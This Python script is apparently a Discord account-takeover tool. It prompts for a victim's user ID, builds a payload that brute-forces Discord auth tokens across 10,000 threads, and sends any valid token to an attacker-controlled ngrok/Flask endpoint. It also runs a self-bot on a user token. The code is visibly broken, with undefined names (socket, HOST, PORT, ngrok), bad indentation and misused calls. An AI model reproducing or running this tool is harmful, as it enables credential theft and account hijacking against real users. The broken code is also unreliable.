import discord
import string
import requests as req
import datetime
import random
import time
import base64
from threading import Thread as thr
import os
from colorama import Fore
import discord, os, json
from discord.ext import commands
from discord.ext.commands import Bot
from plyer import notification
from flask import Flask, request
app = Flask(__name__)

# Flask Is Black

todos = {}
tok = input("ngrok authtoken if you may: ")
@app.route('/a', methods=['POST'])
def main():
    t = request.form['token']
    notif("Found it", t)
    return "", 200

token = input(f"Put Your Token Here: ")
os.system('cls')
def notif(title, message):
    notification.notify(
        title = title,
        message = message,
        )
class MyClient(discord.Client):
  async def on_ready(self):
    userid = input(f"Put The Victims User ID Here: ")
    user = await client.fetch_user(int(userid))
    stamp = user.created_at
    timestamp = str(time.mktime(stamp.timetuple()))
    print(timestamp)
    encodedBytes = base64.b64encode(userid.encode("utf-8"))
    encodedid = str(encodedBytes, "utf-8")
    encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
    encodedstamp = str(encodedBytes, "utf-8")
    time.sleep(3)
    file = f'''
    import requests as req
from threading import Thread as thr
for i in range(10000):
    thr(target = gen, args = ({encodedid})).start()
def gen(encodedid):
  while True:
    second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
    end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
    token = encodedid + "." + second + "." + end
    headers = {'Content-Type': 'application/json', 'authorization': token}
    url = "https://discordapp.com/api/v6/users/@me/library"
    r = req.get(url, headers=headers)
    if r.status_code == 200:
        print(token + ' Valid')
        data = (("token", token))
        r = req.get({ngrok}, data=data)
        exit(0)
    else:
        print(f'{token} Invalid')'''
    open("client.txt", "w").write(file)
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        conn, addr = s.accept()
        with conn:
            print('Connected by', addr)
            conn.sendall(encodedid)
            s.close()
            continue
            
client = MyClient()
ngrok.set_auth_token(tok)
ngrok = str(ngrok.connect(5000)).split(" ->")[0].split(" ")[1].replace('"', "")
client.run(token, bot=False)
app.run(port=5000)
